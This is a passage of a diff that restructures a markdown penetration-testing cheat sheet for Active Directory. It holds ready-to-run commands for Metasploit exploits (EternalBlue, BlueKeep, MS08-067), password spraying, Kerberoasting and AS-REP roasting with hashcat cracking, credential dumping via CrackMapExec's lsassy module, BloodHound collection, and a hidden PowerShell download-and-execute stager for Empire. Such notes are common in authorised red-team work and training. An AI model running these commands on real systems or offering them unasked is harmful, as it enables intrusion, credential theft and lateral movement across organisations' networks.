-$ curl -L https://github.com/PyroTek3/PowerShell-AD-Recon/raw/master/Discover-PSMSExchangeServers > discover-exch.ps1
-PS > Discover-PSMSExchangeServers | Select ServerName,Description | Tee-Object exch.txt
-```
-
-Discover MS SQL servers' FQDN names:
-
-* [github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers)
-
-```
-$ curl -L https://github.com/PyroTek3/PowerShell-AD-Recon/raw/master/Discover-PSMSSQLServers > discover-mssql.ps1
-PS > Discover-PSMSSQLServers | Select ServerName,Description | Tee-Object mssql.txt
-```
-
-
-
-### NetBIOS Scanning
-
-#### nbname (MSF)
-
-```
-msf > use auxiliary/scanner/netbios/nbname
-```
-
-
-
-### LHF Checkers & Exploits
-
-
-#### net_api
-
-**CVE-2008-4250, MS08-067**
-
-Check:
-
-```
-msf > use exploit/windows/smb/ms08_067_netapi
-msf > check
-```
-
-Exploit:
-
-```
-msf > use exploit/windows/smb/ms08_067_netapi
-msf > exploit
-```
-
-
-#### EternalBlue
-
-**CVE-2017-0144, MS17-010**
-
-Check:
-
-```
-msf > use auxiliary/scanner/smb/smb_ms17_010
-```
-
-Exploit:
-
-```
-msf > exploit/windows/smb/ms17_010_eternalblue
-```
-
-
-#### BlueKeep
-
-**CVE-2019-0708**
-
-Check:
-
-```
-msf > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
-```
-
-Exploit:
-
-```
-msf > exploit/windows/rdp/cve_2019_0708_bluekeep_rce
-```
-
-
-#### SIGRed
-
-**CVE-2020-1350**
-
-* [github.com/T13nn3s/CVE-2020-1350](https://github.com/T13nn3s/CVE-2020-1350)
-
-Check:
-
-```
-$ curl -L https://github.com/T13nn3s/CVE-2020-1350/raw/master/CVE-2020-1350-checker.ps1 > CVE-2020-1350-checker.ps1
-PS > .\CVE-2020-1350-checker.ps1
-Please make a selection: 1
-```
-
-
-#### Zerologon
-
-**CVE-2020-1472**
-
-* [github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
-* [github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
-* [github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472](https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472)
-
-
-
-
-## Tricks
+### Tricks
 
 Grep only numbers to get list of ports separated by comma:
 
 ```
-root@kali:$ cat nmap/initial.nmap |egrep -o '^[0-9]{1,5}' |awk -F/ '{ print $1 }' ORS=','; echo
+$ cat nmap/initial.nmap |egrep -o '^[0-9]{1,5}' |awk -F/ '{ print $1 }' ORS=','; echo
 ```
 
 Fast port discovery (Masscan) + versions and NSE scripts (Nmap):
 
 ```
-root@kali:$ masscan --rate=1000 -e tun0 -p0-65535,U:0-65535 127.0.0.1 > ports
-root@kali:$ ports=`cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr "\n" ',' | sed 's/,$//'`
-root@kali:$ nmap -n -Pn -sV -sC [-sT] [--reason] -oA nmap/output 127.0.0.1 -p$ports
-root@kali:$ rm ports
+$ masscan --rate=1000 -e tun0 -p0-65535,U:0-65535 127.0.0.1 > ports
+$ ports=`cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr "\n" ',' | sed 's/,$//'`
+$ nmap -n -Pn -sV -sC [-sT] [--reason] -oA nmap/output 127.0.0.1 -p$ports
+$ rm ports
 ```
 
 Fast port discovery (Nmap) + versions and NSE scripts (Nmap):
 
 ```
-root@kali:$ nmap -n -Pn --min-rate=1000 -T4 127.0.0.1 -p- -vvv | tee ports
-root@kali:$ ports=`cat ports | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
-root@kali:$ nmap -n -Pn -sV -sC [-sT] [--reason] -oA nmap/output 127.0.0.1 -p$ports
-root@kali:$ rm ports
+$ nmap -n -Pn --min-rate=1000 -T4 127.0.0.1 -p- -vvv | tee ports
+$ ports=`cat ports | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
+$ nmap -n -Pn -sV -sC [-sT] [--reason] -oA nmap/output 127.0.0.1 -p$ports
+$ rm ports
 ```
 
 Top TCP ports:
@@ -3283,27 +3135,172 @@ Top UDP ports:
 | 3391 | RD Gateway |
 
 ```
-$ sudo masscan --rate=500 --open -p22,80,443,U:161,U:500 -iL routes.txt --resume paused.conf >> alltcp.txt
+$ sudo masscan --rate=500 --open -p21,22,23,25,53,80,88,111,135,137,139,161,389,443,445,464,500,593,636,873,1099,1433,1521,2049,3268,3269,3306,3389,4786,5432,5555,5900,5985,5986,6379,8080,9389,9200,27017,U:161,U:500 -iL routes.txt --resume paused.conf >> alltcp.txt
 $ mkdir services && for p in 21 22 23 25 53 80 88 111 135 137 139 161 389 443 445 464 500 593 636 873 1099 1433 1521 2049 3268 3269 3306 3389 4786 5432 5555 5900 5985 5986 6379 8080 9389 9200 27017; do grep "port $p/tcp" alltcp.txt | awk -F' ' '{print $6}' | sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > "services/port$p.txt"; done
 ```
 
 
-
-### Nmap
+#### Nmap
 
 Flag `-A`:
 
 ```
-root@kali:$ nmap -A ... == nmap -sC -sV -O --traceroute ...
+$ nmap -A ... == nmap -sC -sV -O --traceroute ...
 ```
 
 Enum WAF:
 
 ```
-root@kali:$ nmap --script http-waf-detect 127.0.0.1 -p80
-root@kali:$ nmap --script http-waf-fingerprint 127.0.0.1 -p80
+$ nmap --script http-waf-detect 127.0.0.1 -p80
+$ nmap --script http-waf-fingerprint 127.0.0.1 -p80
 + wafw00f.py
 ```
+
+
+
+
+## AD Environment Names
+
+Discover domain NetBIOS name:
+
+```
+PS > ([ADSI]"LDAP://megacorp.local").dc
+
+PS > $DomainName = (Get-ADDomain).DNSRoot
+PS > (Get-ADDomain -Server $DomainName).NetBIOSName
+```
+
+Discover DCs' FQDN names:
+
+```
+PS > nslookup -type=all _ldap._tcp.dc._msdcs.$env:userdnsdomain
+
+PS > $ldapFilter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
+PS > $searcher = [ADSISearcher]$ldapFilter
+PS > $searcher.FindAll()
+PS > $searcher.FindAll() | ForEach-Object { $_.GetDirectoryEntry() }
+Or
+PS > ([ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))").FindAll() |ForEach-Object { $_.GetDirectoryEntry() }
+
+PS > [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().DomainControllers.Name
+
+Cmd > nltest /dsgetdc:megacorp.local
+
+PS > $DomainName = (Get-ADDomain).DNSRoot
+PS > $AllDCs = Get-ADDomainController -Filter * -Server $DomainName | Select-Object Hostname,Ipv4address,isglobalcatalog,site,forest,operatingsystem
+
+PS > $AllDCs = (Get-ADForest).GlobalCatalogs
+
+PowerView3 > Get-DomainController | Select Name,IPAddress
+```
+
+Discover global catalog:
+
+```
+PS > Get-ADDomainController -Discover -Service "GlobalCatalog"
+```
+
+Discover MS Exchnage servers' FQDN names:
+
+* [github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers)
+
+```
+$ curl -L https://github.com/PyroTek3/PowerShell-AD-Recon/raw/master/Discover-PSMSExchangeServers > discover-exch.ps1
+PS > Discover-PSMSExchangeServers | Select ServerName,Description | Tee-Object exch.txt
+```
+
+Discover MS SQL servers' FQDN names:
+
+* [github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers)
+
+```
+$ curl -L https://github.com/PyroTek3/PowerShell-AD-Recon/raw/master/Discover-PSMSSQLServers > discover-mssql.ps1
+PS > Discover-PSMSSQLServers | Select ServerName,Description | Tee-Object mssql.txt
+```
+
+
+
+
+## NetBIOS Scanning
+
+
+
+### nbname (MSF)
+
+```
+msf > use auxiliary/scanner/netbios/nbname
+```
+
+
+
+
+## LHF Checkers & Exploits
+
+
+
+### net_api
+
+**CVE-2008-4250, MS08-067**
+
+Check:
+
+```
+msf > use exploit/windows/smb/ms08_067_netapi
+msf > check
+```
+
+Exploit:
+
+```
+msf > use exploit/windows/smb/ms08_067_netapi
+msf > exploit
+```
+
+
+
+### EternalBlue
+
+**CVE-2017-0144, MS17-010**
+
+Check:
+
+```
+msf > use auxiliary/scanner/smb/smb_ms17_010
+```
+
+Exploit:
+
+```
+msf > exploit/windows/smb/ms17_010_eternalblue
+```
+
+
+
+### BlueKeep
+
+**CVE-2019-0708**
+
+Check:
+
+```
+msf > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
+```
+
+Exploit:
+
+```
+msf > exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+```
+
+
+
+### Zerologon
+
+**CVE-2020-1472**
+
+* [github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
+* [github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
+* [github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472](https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472)
 
 
 
@@ -3317,7 +3314,7 @@ root@kali:$ nmap --script http-waf-fingerprint 127.0.0.1 -p80
 Potentially valid users if got any, `John Doe` as an example:
 
 ```
-root@kali:$ cat << EOF >> passwords.txt
+$ cat << EOF >> passwords.txt
 johndoe
 jdoe
 j.doe
@@ -3328,7 +3325,7 @@ EOF
 Common usernames:
 
 ```
-root@kali:$ cat << EOF >> passwords.txt
+$ cat << EOF >> passwords.txt
 admin
 administrator
 root
@@ -3342,7 +3339,7 @@ EOF
 Common patterns:
 
 ```
-root@kali:$ cat << EOF >> passwords.txt
+$ cat << EOF >> passwords.txt
 January
 February
 March
@@ -3372,21 +3369,21 @@ EOF
 Add year and exclamation point to the end of each password:
 
 ```
-root@kali:$ for i in $(cat passwords.txt); do echo "${i}"; echo "${i}\!"; echo "${i}2020"; echo "${i}2020\!"; done > t
-root@kali:$ cp t passwords.txt
+$ for i in $(cat passwords.txt); do echo "${i}"; echo "${i}\!"; echo "${i}2020"; echo "${i}2020\!"; done > t
+$ cp t passwords.txt
 ```
 
 Mutate the wordlist with hashcat rules:
 
 ```
-root@kali:$ hashcat --force --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule |sort -u |awk 'length($0) > 7' > t
-root@kali:$ cp t passwords.txt
+$ hashcat --force --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule |sort -u |awk 'length($0) > 7' > t
+$ cp t passwords.txt
 ```
 
 Simple list for password spraying:
 
 ```
-root@kali:$ cat << EOF >> passwords.txt
+$ cat << EOF >> passwords.txt
 admin
 root
 changeme
@@ -3418,10 +3415,12 @@ $ cewl -d 5 -m 5 -w passwords.txt --with-numbers --email_file emails.txt http://
 
 
 
-### Tools
+
+## Tools
 
 
-#### kerbrute
+
+### kerbrute
 
 * [github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)
 
@@ -3429,7 +3428,8 @@ $ cewl -d 5 -m 5 -w passwords.txt --with-numbers --email_file emails.txt http://
 $ ./kerbrute -v --delay 100 -d megacorp.local -o kerbrute-passwordspray-123456.log passwordspray users.txt '123456'
 ```
 
-#### DomainPasswordSpray
+
+### DomainPasswordSpray
 
 * [github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
 
@@ -3438,7 +3438,8 @@ PS > Invoke-DomainPasswordSpray -UserList .\users.txt -Domain megacorp.local -Pa
 ```
 
 
-#### rpcclient
+
+### rpcclient
 
 ```
 $ rpcclient -U '' -N 127.0.0.1
@@ -3449,14 +3450,16 @@ rpcclient $> enumdomgroups
 ```
 
 
-#### enum4linux
+
+### enum4linux
 
 ```
 $ enum4linux -v -a 127.0.0.1 | tee enum4linux.txt
 ```
 
 
-#### nullinux.py
+
+### nullinux.py
 
 * [github.com/m8r0wn/nullinux](https://github.com/m8r0wn/nullinux)
 
@@ -3466,14 +3469,8 @@ $ nullinux.py 127.0.0.1
 ```
 
 
-#### samrdump.py
 
-```
-root@kali:$ samrdump.py 127.0.0.1
-```
-
-
-#### crowbar
+### crowbar
 
 * [github.com/galkan/crowbar](https://github.com/galkan/crowbar)
 
@@ -3482,69 +3479,8 @@ $ crowbar -b rdp -s 192.168.1.0/24 -u snovvcrash -c 'Passw0rd!'
 ```
 
 
-#### Bloodhound
 
-##### Setup
-
-```
-$ sudo apt install neo4j
-$ mkdir -p /usr/share/neo4j/logs/
-$ sudo neo4j console
-...change default password at localhost:7474...
-$ sudo neo4j start
-$ wget https://github.com/BloodHoundAD/BloodHound/releases/latest
-$ unzip BloodHound-linux-x64.zip && rm BloodHound-linux-x64.zip && cd BloodHound-linux-x64
-$ sudo ./BloodHound --no-sandbox
-Or
-$ sudo chown root:root chrome-sandbox
-$ sudo chmod 4755 chrome-sandbox
-$ ./BloodHound
-```
-
-##### SharpHound
-
-Collect graphs via `Collectors/SharpHound.ps1`:
-
-```
-$ curl -L https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 > sharphound.ps1
-PS > Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup -Domain megacorp.local -LDAPUser snovvcrash -LDAPPass 'Passw0rd!'
-```
-
-Run session loop (\~2 hours for best results):
-
-```
-$ curl -L https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe > sharphound.exe
-PS > .\SharpHound.exe -c All,GPOLocalGroup -d roundsoft.local --ldapusername snovvcrash --ldappassword 'Passw0rd!'
-```
-
-##### Cypher
-
-* [hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
-
-Show percentage of collected user sessions ([example](https://www.youtube.com/watch?v=q86VgM2Tafc)):
-
-```
-# http://localhost:7474/browser/
-MATCH (u1:User)
-WITH COUNT(u1) AS totalUsers
-MATCH (c:Computer)-[r:HasSession]->(u2:User)
-WITH totalUsers, COUNT(DISTINCT(u2)) AS usersWithSessions
-RETURN totalUsers, usersWithSessions, 100 * usersWithSessions / totalUsers AS percetange
-```
-
-##### BloodHound.py
-
-* [github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
-
-Collect graphs via `BloodHound.py` (with BloodHound running):
-
-```
-$ git clone https://github.com/fox-it/BloodHound.py ~/tools/BloodHound.py && cd ~/tools/BloodHound.py && python setup.py install && cd -
-$ bloodhound-python -c All -u snovvcrash -p 'Passw0rd!' -d megacorp.local -ns 127.0.0.1
-```
-
-
-#### Impacket
+### impacket
 
 * [github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
 
@@ -3555,19 +3491,53 @@ $ pipenv install -r requirements.txt && pipenv shell
 (impacket) $ python examples/psexec.py
 ```
 
-```
-$ lookupsid.py MEGACORP/s.freeside:'Passw0rd!'@127.0.0.1 20000
 
+#### lookupsid.py
+
+```
+$ lookupsid.py MEGACORP/s.freeside:'Passw0rd!'@127.0.0.1 20000 | tee ~/workspace/log/lookupsid.out
+$ cat ~/workspace/log/lookupsid.out | grep SidTypeUser | grep -v '\$' | awk -F'\' '{print $2}' | awk '{print $1}' > ~/workspace/enum/allusers.txt
+```
+
+
+#### GetNPUsers.py
+
+```
 $ GetNPUsers.py MEGACORP/ -dc-ip 127.0.0.1 -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile asprep.txt | tee GetNPUsers.log
 $ cat GetNPUsers.log | grep -v 'Client not found in Kerberos database'
 $ ./hashcat64.exe -m 18200 -a 0 -w 4 -O --session=snovvcrash hashes/asprep.txt seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
+```
 
+
+#### GetUserSPNs.py
+
+```
 $ GetUserSPNs.py MEGACORP/s.freeside:'Passw0rd!' -dc-ip 127.0.0.1 -save
 $ ./hashcat64.exe -m 13100 -a 0 -w 4 -O --session=snovvcrash hashes/tgsrep.txt seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
 ```
 
 
-#### CrackMapExec
+#### samrdump.py
+
+```
+$ samrdump.py 127.0.0.1
+```
+
+
+
+### adidnsdump
+
+* [github.com/dirkjanm/adidnsdump](https://github.com/dirkjanm/adidnsdump)
+
+```
+$ cd ~/workspace/enum/
+$ adidnsdump -u 'megacorp.local\snovvcrash' -p 'Passw0rd!' DC01.megacorp.local
+$ mv records.csv adidnsdump.csv
+```
+
+
+
+### CrackMapExec
 
 Install bleeding-edge:
 
@@ -3598,7 +3568,75 @@ $ CME smb 127.0.0.1 -u snovvcrash -p '' -M lsassy
 ```
 
 
-#### Empire
+
+### Bloodhound
+
+
+#### Setup
+
+```
+$ sudo apt install neo4j
+$ mkdir -p /usr/share/neo4j/logs/
+$ sudo neo4j console
+...change default password at localhost:7474...
+$ sudo neo4j start
+$ wget https://github.com/BloodHoundAD/BloodHound/releases/latest
+$ unzip BloodHound-linux-x64.zip && rm BloodHound-linux-x64.zip && cd BloodHound-linux-x64
+$ sudo ./BloodHound --no-sandbox
+Or
+$ sudo chown root:root chrome-sandbox
+$ sudo chmod 4755 chrome-sandbox
+$ ./BloodHound
+```
+
+
+#### Collectors
+
+`SharpHound.ps1`:
+
+```
+$ curl -L https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 > sharphound.ps1
+PS > Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup -Domain megacorp.local -LDAPUser snovvcrash -LDAPPass 'Passw0rd!'
+PS > Invoke-Bloodhound -CollectionMethod SessionLoop -Domain megacorp.local
+```
+
+`SharpHound.exe`:
+
+```
+$ curl -L https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe > sharphound.exe
+PS > .\SharpHound.exe -c All,GPOLocalGroup -d megacorp.local --ldapusername snovvcrash --ldappassword 'Passw0rd!'
+PS > .\SharpHound.exe -c SessionLoop -d megacorp.local
+```
+
+
+#### Cypher
+
+* [hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
+
+Show percentage of collected user sessions ([example](https://www.youtube.com/watch?v=q86VgM2Tafc)):
+
+```
+# http://localhost:7474/browser/
+MATCH (u1:User)
+WITH COUNT(u1) AS totalUsers
+MATCH (c:Computer)-[r:HasSession]->(u2:User)
+WITH totalUsers, COUNT(DISTINCT(u2)) AS usersWithSessions
+RETURN totalUsers, usersWithSessions, 100 * usersWithSessions / totalUsers AS percetange
+```
+
+
+#### BloodHound.py
+
+* [github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
+
+```
+$ cd ~/workspace/enum/bloodhound/bloodhound.py/
+$ bloodhound-python -c All,LoggedOn -u snovvcrash -p 'Passw0rd!' -d megacorp.local -ns 127.0.0.1
+```
+
+
+
+### Empire
 
 * [github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)
 
@@ -3619,7 +3657,8 @@ PS > powershell -NoP -sta -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebCl
 ```
 
 
-#### PowerView
+
+### PowerView
 
 * [www.harmj0y.net/blog/powershell/make-powerview-great-again/](https://www.harmj0y.net/blog/powershell/make-powerview-great-again/)
 * [github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
@@ -3639,7 +3678,8 @@ PowerView3 > Invoke-Kerberoast -OutputFormat Hashcat | fl
 ```
 
 
-#### cve-2019-1040-scanner
+
+### cve-2019-1040-scanner
 
 * [github.com/fox-it/cve-2019-1040-scanner/blob/master/scan.py](https://github.com/fox-it/cve-2019-1040-scanner/blob/master/scan.py)
 
@@ -3647,6 +3687,7 @@ PowerView3 > Invoke-Kerberoast -OutputFormat Hashcat | fl
 $ python scan.py MEGACORP/snovvcrash:'Passw0rd!'@10.10.13.37
 $ python scan.py --target-file DCs.txt MEGACORP/snovvcrash:'Passw0rd!'
 ```
+
 
 
 
@@ -3672,7 +3713,8 @@ $client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("h
 
 
 
-### Unsorted
+
+## Unsorted
 
 * [www.infosecmatter.com/powershell-commands-for-pentesters/](https://www.infosecmatter.com/powershell-commands-for-pentesters/)
 
@@ -4264,7 +4306,7 @@ Known issues:
 Configure multiple interfaces to work simultaneously:
 
 ```
-root@kali:$ cat /etc/network/interfaces
+$ cat /etc/network/interfaces
 # This file describes the network interfaces available on your system
 # and how to activate them. For more information, see interfaces(5).
 
@@ -4288,9 +4330,9 @@ iface lo inet loopback
 ```
 
 ```
-root@kali:$ ifup eth0
-root@kali:$ ifup eth1
-root@kali:$ ifup eth2
+$ ifup eth0
+$ ifup eth1
+$ ifup eth2
 ```
 
 * [unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on](https://unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on)
@@ -4306,18 +4348,18 @@ root@kali:$ ifup eth2
 Mount:
 
 ```
-root@kali:$ mkdir ~/Desktop/Share
-root@kali:$ mount -t vboxsf /mnt/share-host ~/Desktop/Share
+$ mkdir ~/Desktop/Share
+$ mount -t vboxsf /mnt/share-host ~/Desktop/Share
 Or (if mounted from VBox settings)
-root@kali:$ ln -s /mnt/share-host ~/Desktop/Share
+$ ln -s /mnt/share-host ~/Desktop/Share
 
-root@kali:$ sudo adduser $USER vboxsf
+$ sudo adduser $USER vboxsf
 ```
 
 Automount:
 
 ```
-root@kali:$ crontab -e
+$ crontab -e
 "@reboot    sleep 10; mount -t vboxsf /mnt/share-host ~/Desktop/Share"
 ```
 
